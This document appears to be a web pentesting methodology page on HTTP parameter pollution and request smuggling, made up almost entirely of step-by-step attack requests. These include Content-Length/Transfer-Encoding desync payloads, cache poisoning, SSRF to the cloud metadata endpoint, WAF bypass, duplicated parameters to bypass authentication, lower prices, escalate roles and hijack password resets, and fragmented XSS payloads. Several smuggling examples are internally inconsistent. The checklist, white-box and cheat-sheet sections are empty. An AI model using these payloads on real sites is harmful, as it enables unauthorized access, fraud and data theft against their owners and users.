# HTTP Parameter Pollution

## Check List

## Methodology

### Black Box

#### HRS With Content-Length And Transfer-Encoding

{% stepper %}
{% step %}
Inject conflicting Content-Length and Transfer-Encoding headers to test for desync

```http
POST /api HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the response indicates the backend processed the smuggled `GET /admin` request
{% endstep %}
{% endstepper %}

***

#### HTTP/2 To HTTP/1.1 Downgrade

{% stepper %}
{% step %}
If the site supports HTTP/2, force a downgrade to HTTP/1.1 with a smuggling payload

```http
POST /api HTTP/2
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the backend executes the smuggled GET /admin request
{% endstep %}
{% endstepper %}

***

#### Multi-Chunked Smuggling

{% stepper %}
{% step %}
Inject multiple Transfer-Encoding headers to confuse proxy parsing

```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request is processed by the backend
{% endstep %}
{% endstepper %}

***

#### Invalid TE Header Manipulation

{% stepper %}
{% step %}
Use malformed Transfer-Encoding headers to bypass validation

```http
POST /api HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: cHuNkEd
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response includes evidence of the smuggled request
{% endstep %}
{% endstepper %}

***

#### Cache Poisoning With HRS

{% stepper %}
{% step %}
Inject a payload to poison the CDN cache

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /index.html HTTP/1.1
X-Cache-Inject: evil.js
```
{% endstep %}

{% step %}
Check if the cache serves evil.js to subsequent users
{% endstep %}
{% endstepper %}

***

#### SSRF With HRS

{% stepper %}
{% step %}
Smuggle a payload to access internal services

```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response contains internal metadata (AWS metadata)
{% endstep %}
{% endstepper %}

***

#### WAF Bypass With HRS

{% stepper %}
{% step %}
Split payloads to evade WAF detection

```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
X-Bypass: evasion

0
GET /secret HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request bypasses the WAF and reaches the backend
{% endstep %}
{% endstepper %}

***

#### Blind HRS

{% stepper %}
{% step %}
Inject a time-delayed payload to detect blind smuggling

```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 40

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Measure response delays to infer smuggling success
{% endstep %}
{% endstepper %}

***

#### Multi-Hop Proxy Smuggling

{% stepper %}
{% step %}
Inject payloads across a chain of proxies (CDN → Load Balancer → Backend)

```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Trace the smuggled request across each hop and check for discrepancies in processing
{% endstep %}
{% endstepper %}

***

#### Test Query String Pollution

{% stepper %}
{% step %}
To test for SSPP in query strings, you can insert query syntax characters like `#`, `&`, and `=` into your input and observe how the application responds
{% endstep %}

{% step %}
Consider a vulnerable application that searches for users based on their username. The request might look like this

```url
GET /usernameSearch?name=jack&returningPath=/main
```
{% endstep %}

{% step %}
The server translates this to an internal API request

```http
GET /usernames/search?name=jack#foo&publicProfile=true
```
{% endstep %}

{% step %}
If the query is truncated, the publicProfile parameter might be bypassed, potentially exposing non-public profiles
{% endstep %}
{% endstepper %}

***

#### Bypassing Authentication

{% stepper %}
{% step %}
Prepare a test login endpoint that accepts username and password parameters
{% endstep %}

{% step %}
Record a normal login request

```http
POST /login
username=admin&password=wrongpassword
```
{% endstep %}

{% step %}
Send the request with multiple password values

```
POST /login
username=admin&password=wrongpassword&password=correctpassword
```
{% endstep %}

{% step %}
Inspect the server response and session behavior (cookies). If authentication succeeds because the last or a specific occurrence is processed, HPP is present
{% endstep %}
{% endstepper %}

***

#### Manipulating SQL Queries (Overwriting id)

{% stepper %}
{% step %}
Identify the endpoint that reads id and returns a user profile (e.g., `/profile?id=...`)
{% endstep %}

{% step %}
Record a normal request and note the response

```
GET /profile?id=1
```
{% endstep %}

{% step %}
Send a request with duplicated id parameters

```
GET /profile?id=1&id=2
```
{% endstep %}
{% endstepper %}

***

#### Tampering with API Calls (API key parameter)

{% stepper %}
{% step %}
Identify an API endpoint using apikey for authentication (e.g., `/api/data?user=123&apikey=...`)
{% endstep %}

{% step %}
Record a request with an invalid key
{% endstep %}

{% step %}
Send a request with multiple apikey parameters where a valid key appears last

```json
GET /api/data?user=123&apikey=invalid-key&apikey=valid-key
```
{% endstep %}

{% step %}
Check whether access is granted; if the last parameter is used and access is allowed, HPP is confirmed
{% endstep %}
{% endstepper %}

***

#### Altering Price Calculations (E-commerce)

{% stepper %}
{% step %}
Locate the checkout endpoint that accepts a price parameter
{% endstep %}

{% step %}
Record a normal purchase request

```json
POST /checkout
product=123&price=100
```
{% endstep %}

{% step %}
Send the request with duplicate price values

```
POST /checkout
product=123&price=100&price=1
```
{% endstep %}

{% step %}
Verify server response, cart totals, or final calculation; if the last price is applied resulting in reduced cost, HPP is present
{% endstep %}
{% endstepper %}

***

#### Bypassing Input Validation and WAF (XSS evasion)

{% stepper %}
{% step %}
Identify a point that reflects or stores user input (e.g., comment parameter)
{% endstep %}

{% step %}
Note a simple blocked input example

```javascript
comment=<script>alert(1)</script>
```
{% endstep %}

{% step %}
Send input with fragmented/duplicated parameter pieces so the server-side reconstruction may bypass filters, for example

```javascript
comment=<scr&comment=ipt>alert(1)</scr&comment=ipt>
```
{% endstep %}
{% endstepper %}

***

#### HTTP Parameter Pollution (Privilege Escalation)

{% stepper %}
{% step %}
First, an attacker identifies a vulnerable endpoint that accepts query parameters. This can be done through manual testing or automated tools like Burp Suite
{% endstep %}

{% step %}
Next, the attacker crafts a request with duplicate parameters or adds unexpected parameters to the URL

```http
https://example.com/api/user?role=admin&role=user
```
{% endstep %}

{% step %}
In this case, if the application does not properly validate the ‘role’ parameter, it might grant admin privileges to the user
{% endstep %}

{% step %}
The attacker then analyzes the server’s response to see if the manipulation led to any unexpected behavior. Successful exploitation can result in privilege escalation, information disclosure, or even remote code execution, depending on the application’s logic
{% endstep %}
{% endstepper %}

***

#### Broken Access Control

{% stepper %}
{% step %}
Enter the site and use the Burp Suite tool to identify the points of a site
{% endstep %}

{% step %}
Identify initial API endpoint

```json
GET /api/v1/user/profile?userId=12345 
```
{% endstep %}

{% step %}
and send simple request to observe normal server behavior
{% endstep %}

{% step %}
Check if you can access other accounts by adding another parameter as shown below

```json
GET /api/v1/user/profile?userId=12345&userId=67890
```
{% endstep %}

{% step %}
If it gives an error, we will keep the value constant, but we will add a parameter and check the behavior of the server

```json
GET /api/v1/user/profile?userId=12345&userId=12345
```
{% endstep %}
{% endstepper %}

***

#### JSON Parameter Pollution In Export Proccess

{% stepper %}
{% step %}
Check out endpoints that perform the extraction process in different formats, for example the following request in an API Endpoint

```json
POST /api/admin/exportData
Content-Type: application/json

{"format":"csv","filters":{"userId":12345}}
```
{% endstep %}

{% step %}
In this request, we have to check what will be the answer to the server's request if we add another format parameter, for example

```json
{"format":"csv","format":"json"}
```
{% endstep %}

{% step %}
If it gives us an error in the answer as below

```json
{"error":"Unexpected token , in JSON at position 15"}
```
{% endstep %}

{% step %}
Send the next request using capital words as shown below

```json
{"format":"csv","Format":"json"}
```
{% endstep %}

{% step %}
in Response

```json
{"status":"processing","file":"/exports/data-2023-10-25.json"}
```
{% endstep %}
{% endstepper %}

***

#### JSON Parameter Pollution Authentication bypass

{% stepper %}
{% step %}
Perform the authentication process and intercept the application process
{% endstep %}

{% step %}
If there are parameters in the request as below

```json
POST /api/auth/verify
Content-Type: application/json

{"token":"user_token_123","role":"user"}
```
{% endstep %}

{% step %}
Try to add other parameters to the request as shown below

```json
{"token":"user_token_123","token":"admin_token_abc","role":"user","role":"admin"}
```
{% endstep %}

{% step %}
The response

```
{"authenticated": true, "user": "admin", "permissions": ["read","write","delete"]}
```
{% endstep %}
{% endstepper %}

***

#### Test Case in Login Parameter

{% stepper %}
{% step %}
Enter the site and use the Burp Suite tool to identify the points of a site
{% endstep %}

{% step %}
Identify initial JSON API endpoint `/api/v1/auth/login`
{% endstep %}

{% step %}
and send simple request to observe normal server behavior

```json
{
    "username": "alice",
    "password": "pass123"
}
```
{% endstep %}

{% step %}
Test HPP by adding duplicate keys as shown below

```json
{
    "username": "alice",
    "password": "pass123",
    "username": "bob"
}
```
{% endstep %}

{% step %}
If it processes first value for auth but last for update, we will keep the key constant but duplicate and check the behavior of the server

```json
{
    "role": "user",
    "role": "admin"
}
```
{% endstep %}

{% step %}
#### Test password reset abuse `/api/v1/reset-password`

```json
POST /api/v1/reset-password
{
    "username": "alice",
    "new_password": "NewPass123",
    "confirm_password": "NewPass123",
    "username": "bob"
}
```
{% endstep %}

{% step %}
#### Test input filter bypass `/api/v1/update-profile`

```json
{
    "email": "justanexample@example.com",
    "email": "<script>alert(1)</script>"
}
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
